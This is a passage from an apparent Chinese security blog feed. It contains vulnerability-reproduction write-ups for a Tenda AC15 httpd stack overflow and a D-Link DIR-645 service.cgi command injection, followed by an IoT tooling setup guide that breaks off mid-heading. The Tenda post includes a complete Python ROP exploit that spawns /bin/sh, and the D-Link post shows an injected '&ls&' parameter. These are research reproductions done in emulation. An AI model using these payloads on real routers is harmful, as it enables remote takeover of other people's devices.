        <content type="html"><![CDATA[<p>TENDA-AC15 型号路由器上的一个漏洞，产生原因是没有限制用户输入，使用 sscanf 直接将输入拷贝到栈上，导致栈溢出。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li><p>漏洞固件在官网没找着，去百度找到了，地址在<a href="http://www.kuaihou.com/soft/311837.html">这里</a></p><p>版本号：V15.03.1.16</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210113356.png" alt="image-20210210113356276"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>需要配置好 qemu 桥接网络，不能就去 patch 一下 check_network 的返回值。</p><h3 id="设置桥接网络"><a href="#设置桥接网络" class="headerlink" title="设置桥接网络"></a>设置桥接网络</h3><p>安装依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>修改 <code> /etc/network/interfaces</code> 网卡配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>修改 qemu 网络脚本 <code>/etc/qemu-ifup</code> 为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line">echo &quot;Executing &#x2F;etc&#x2F;qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridged mode...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure><p>给脚本加上权限，重启网络服务，如果连不上网可以重启一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure><p>运行程序还是报错，通过字符串定位到 <code>ConnectCfm</code> 函数，看不到函数体，应该是在其他文件定义的，这里也要 patch 改下跳转条件：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124651.png" alt="image-20210210124651672"></p><p>然后就能正常运行 httpd 服务（如果 check_network 检查是 patch 解决的，这里 ip 会有点诡异）：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124735.png" alt="image-20210210124735721"></p><p>在 <code>R7WebsSecurityHandler</code> 开头打上断点，这个函数处理 <code>/goform/execCommand</code> 的请求：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210131807.png" alt="image-20210210131807628"></p><p>用 burpsuite 给 <code>/goform/execCommand</code> 发个包，加上 Cookie 的 password 属性，长度弄长点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;goform&#x2F;execCommand HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.211.7</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure><p>当检索 password 属性后将值经过 sscanf 正则过滤后存放到 v34 的字符串列表局部变量：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210140729.png" alt="image-20210210140543403"></p><p>继续运行就会报段错误退出：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210141320.png" alt="image-20210210141320615"></p><p>用 gdb-multiarch 跟一下，查看一下地址信息。发现是在一个 if 判断中退出报错，而不是在 R7WebsSecurityHandler 退出，这样控制程序流有点复杂：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211012033.png" alt="image-20210211012033940"></p><p>根据规则如果 URL 文件后缀不是 gif 才进入 if 函数体，那么就加一个 <code>.gif</code> 让程序流直接从 R7WebsSecurityHandler 返回，这样控制起来就简单多。</p><p>然后用 cycli 生成字符串测量长度，要注意加 1 再算 padding ，得出长度为 447 。成功控制返回地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;Cookie&#39;: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211232722.png" alt="image-20210211232722219"></p><h3 id="ROP-利用链"><a href="#ROP-利用链" class="headerlink" title="ROP 利用链"></a>ROP 利用链</h3><p>arm 返回地址是在 pc 寄存器，不是在栈上。qemu 虚拟机没有随机化地址。</p><p>构造出 <code>system(&#39;/bin/sh&#39;)</code> ，<code>/bin/sh</code> 长度超过 4 字节，由于对齐要占据 8 字节空间，<code>pop r0,pc</code> gadget 不能直接用了。</p><p>先用 <code>pop r3,pc</code> 将 system 放到 r3 ，同时压入 <code> mov r0,sp;blx r3</code> ，这时 sp 寄存器指向 /bin/sh ，将参数地址移动到 r0 ，然后跳转 r3 地址。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234133.png" alt="image-20210211234133733"></p><p>qemu 需要加上 -strace 查看调用：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234504.png" alt="image-20210211153837937"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.211.7&quot;</span></span><br><span class="line">command = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&#123;:s&#125;/goform/exeCommand&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x3fde6000</span></span><br><span class="line">pop_r3_pc = struct.pack(<span class="string">&quot;&lt; I&quot;</span>,<span class="number">0x00018298</span>+libc)<span class="comment">#pop r3 pc</span></span><br><span class="line">mov_r0_sp_blx_r3 = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x00040cb8</span> + libc)<span class="comment"># mov r0 sp; blx r3</span></span><br><span class="line">system = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x0005A270</span>+libc)</span><br><span class="line">command = command.encode()<span class="comment"># &#x27;byte&#x27;</span></span><br><span class="line">password = <span class="string">b&quot;A&quot;</span> * <span class="number">444</span>+<span class="string">b&quot;.gif&quot;</span>+pop_r3_pc+system+mov_r0_sp_blx_r3+command</span><br><span class="line">headers[<span class="string">&#x27;Cookie&#x27;</span>]=<span class="string">b&quot;password=&quot;</span>+password</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url,headers=headers,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/wireless/166869.html">https://www.freebuf.com/articles/wireless/166869.html</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">https://wzt.ac.cn/2019/03/19/CVE-2018-5767/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tenda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2018-01084 远程代码执行复现</title>
      <link href="archives/224/"/>
      <url>archives/224/</url>
      
        <content type="html"><![CDATA[<p>Dlink DIR 615/645/815 路由上远程代码执行漏洞。漏洞存在于 <code>/htdocs/cgibin</code> 二进制文件中，原因是 <code>service.cgi</code> 中未经过滤就将用户输入拼接到命令中。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>漏洞固件 <a href="https://tsd.dlink.com.tw/ddgo">Firmware:DIR-645_A1_FW: v1.02b08 (for WW)</a> （tw官网选择 DIR-645 第一个文件）<br>版本号为 v1.02（v1.03完成修复）</li><li>qemu v5.2</li><li>Ubuntu 18.04</li><li>ida 7.5（能搞 mips 反编译工具都行）</li></ul><p>直接运行如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215850.png" alt="image-20210209215850264"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>strrchr</code> 匹配出 <code>/</code> 后面的参数后，<code>strcmp</code> 匹配参数进入各个服务函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215638.png" alt="image-20210209215637987"></p><p>定位到 <code>servicecgi_main</code> 。<code>getenv</code> 提取参数依据两种请求方式分别给 v2 赋值，不匹配或为空则退出；提取请求方式后，将参数传入 <code>cgibin_parse_request</code> 解析 http 请求：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209220241.png" alt="image-20210209220241088"></p><p>到里面分别提取<code>REQUEST_URI</code>、 <code>CONTENT_TYPE</code>、<code>CONTENT_LENGTH</code>  ，</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p>当解析无误后返回上层函数，然后进入权限认证：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221306.png" alt="image-20210209221306768"></p><p>在这个认证函数内部的函数 <code>sess_get_uid</code> ，可以看到是从 HTTP_COOKIE 里面获取 uid 判断：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221716.png" alt="image-20210209221716723"></p><p>进入 <code> sub_40A950</code> 将 URL ？ 后面部分与关键词匹配，如果一致就开始准备进入拼接命令字符串：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222749.png" alt="image-20210209222749033"></p><p><code>lxmldbc_system</code> 里面将预制指令和 URL 里面参数进行拼接：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222937.png" alt="image-20210209222937398"></p><p>Event 命令字符串为：<code>&quot;event %s &gt; /dev/null&quot;</code> ，中间我们可以加上任意指令比如：<code>&quot;event &amp;ls&amp; &gt; /dev/null&quot;</code></p><p>开始测试前，权限认证那里由于少文件等，要将那个函数 patch 改一下。把跳转 session 改掉不然会卡一段时间，因为仿真没有 <code>/var/session</code> 文件；v1 的复制改为 1 就是代表有权限：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232026.png" alt="image-20210209232026784"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231657.png" alt="image-20210209231657216"></p><p>测试一下，启动命令：</p><blockquote><p>-0：传入第一个参数，进入 servicecgi_main</p><p>-E：选项传入自定义的环境变量</p><p>-strace：显示具体信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p>启动后，报错解析不了：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209230233.png" alt="image-20210209230233246"></p><p>加上调试解析函数看都是解析正确，单步调试就发现是成功解析后执行 retrun 函数并没有返回到上一层，而是继续往下执行 95 行的 retrun v9 这是的 v9 为 -1 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231306.png" alt="image-20210209231306395"></p><p>cataLpa 师傅复现文章也出现相同情况，推测可能是 qemu 仿真问题。这里可以直接改寄存器或者 patch 一下。</p><p>再次启动，这次就正常回显，但是没有运行附加进去的指令：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232205.png" alt="image-20210209232205679"></p><p>附加上 <code>-strace</code> 查看一下详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel -g 1234 -strace \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209233118.png" alt="image-20210209233118432"></p><p>指令已经附加上去，应该是 qemu 环境问题运行不了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/">https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOT环境配置V1&amp;入门练习</title>
      <link href="archives/6130b222/"/>
      <url>archives/6130b222/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这里 IOT 环境主要是指<strong>路由器</strong>的分析环境，当然摄像头之类的设备也是能够进行分析的。</p><p>下面配置是基于 ubuntu18.04 进行配置。</p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><p>apt-get install 的 binwalk 是残缺版本，解析某些压缩固件时识别不了。因此选择到 github 仓库安装完整版本：</p><blockquote><p><a href="https://github.com/ReFirmLabs/binwalk/">https://github.com/ReFirmLabs/binwalk/</a></p></blockquote><p>apt 装的差点解释器，对于 ubuntu\debian 有提供一键脚本，安装的内容查阅<a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md">官方文档</a>。py2 和 py3 都支持，py3 速度快点就装它了，手动安装方法看前面官方文档。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line"><span class="built_in">cd</span> binwalk</span><br><span class="line"><span class="comment"># 安装binwalk</span></span><br><span class="line">sudo python3 setup.py install</span><br><span class="line"><span class="comment"># 安装拓展</span></span><br><span class="line">sudo ./deps.sh</span><br></pre></td></tr></table></figure><p>其中 cramfsprogs 无法 apt 安装，要手动装下：</p><blockquote><p>参考师傅文章：<a href="https://blog.csdn.net/wuyou1995/article/details/106215540/">https://blog.csdn.net/wuyou1995/article/details/106215540/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://launchpadlibrarian.net/251826685/cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br><span class="line">sudo dpkg -i cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br></pre></td></tr></table></figure><h3 id="使用指令"><a href="#使用指令" class="headerlink" title="使用指令"></a>使用指令</h3><p>按照预定的配置文件中提取方法从固件中提取探测到的文件及系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e filename.bin</span><br></pre></td></tr></table></figure><p>根据 magic 签名扫描结果进行递归提取：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me filename.bin</span><br></pre></td></tr></table></figure><p>限制递归提取深度，默认深度 8 ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me -d 5 filename.bin</span><br></pre></td></tr></table></figure><h2 id="mips-交叉编译环境"><a href="#mips-交叉编译环境" class="headerlink" title="mips 交叉编译环境"></a>mips 交叉编译环境</h2><p>这个目前来说主要是用在 hook 某些函数让整个固件系统或单个程序能正常运行，或者是制作后门时用到。这个编译环境两种安装方法：buildroot 或者是 apt 直接安装编译好的版本。</p><h3 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h3><p>这种方法所网络环境约束<strong>极大</strong>，主要是那个内核文件资源在国外，挂着代理也下载很慢。也尝试过通过下载软件把内核文件下载下来，放到对应文件夹进行 make ，它还是会重新下载。最后去冬令营的时候，蹭 hw 的网就能下载到，虽然还是很慢，但起码能下完。</p><blockquote><p>参考师傅<a href="https://blog.csdn.net/QQ1084283172/article/details/68950682">文章</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装依赖库</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libncurs*</span><br><span class="line">sudo apt-get install libncurses5-dev patch</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/buildroot/buildroot.git</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 进行编译的配置</span></span><br><span class="line"><span class="built_in">cd</span> buildroot</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>下面进入到 gui 配置窗口，需要修改三个属性（由于版本位置可能不同）：</p><ul><li><p><code>Target Option</code>–<code>Target Architecture</code> 修改为 <code>MIPS(little endian)</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206212742.png" alt="image-20210206212735360"></p></li><li><p><code>Target Option</code>–<code>Target Architecture Variant</code> 修改为 <code>Generic MIPS32</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206212756.png" alt="image-20210206212756857"></p></li><li><p><code>Toolchain</code>–<code>Kernel Headers</code> 修改为小于等于主机内核的版本(查询指令：uname -r)，我本地为 4.15.0 ，那就选 4.14.x </p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206213129.png" alt="image-20210206213129568"></p></li></ul><p>保存配置后退出</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206213247.png" alt="image-20210206213247200"></p><p>进行编译，最好设置代理编译过程会下载国外资源，保持网络通畅：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure><p>编译完成后在 output/host/bin 文件夹就能看到文件了，图中文件夹是我自己改了名字而已：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318173339.png" alt="image-20210318173306250"></p><p>将 output 文件夹改名字，然后重复上面步骤，安装 mipsel 交叉编译链。</p><h3 id="apt-install"><a href="#apt-install" class="headerlink" title="apt install"></a>apt install</h3><p>apt 直接安装编译好的版本，免去下载内核资源编译的问题。这种方法也同样使用安装 arm 等交叉编译链。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/wfxzf/article/details/88974144">https://blog.csdn.net/wfxzf/article/details/88974144</a></p></blockquote><h4 id="mips（大端序）"><a href="#mips（大端序）" class="headerlink" title="mips（大端序）"></a>mips（大端序）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install emdebian-archive-keyring</span><br><span class="line">sudo apt-get install linux-libc-dev-mips-cross libc6-mips-cross libc6-dev-mips-cross binutils-mips-linux-gnu gcc-mips-linux-gnu g++-mips-linux-gnu</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210206235709.png" alt="image-20210206235709724"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207010045.png" alt="image-20210207010045821"></p><h4 id="mipsel（小端序）"><a href="#mipsel（小端序）" class="headerlink" title="mipsel（小端序）"></a>mipsel（小端序）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install emdebian-archive-keyring</span><br><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross libc6-mipsel-cross libc6-dev-mipsel-cross binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu g++-mipsel-linux-gnu</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207115930.png" alt="image-20210207115930839"></p><h2 id="qemu-虚拟机桥接网络"><a href="#qemu-虚拟机桥接网络" class="headerlink" title="qemu 虚拟机桥接网络"></a>qemu 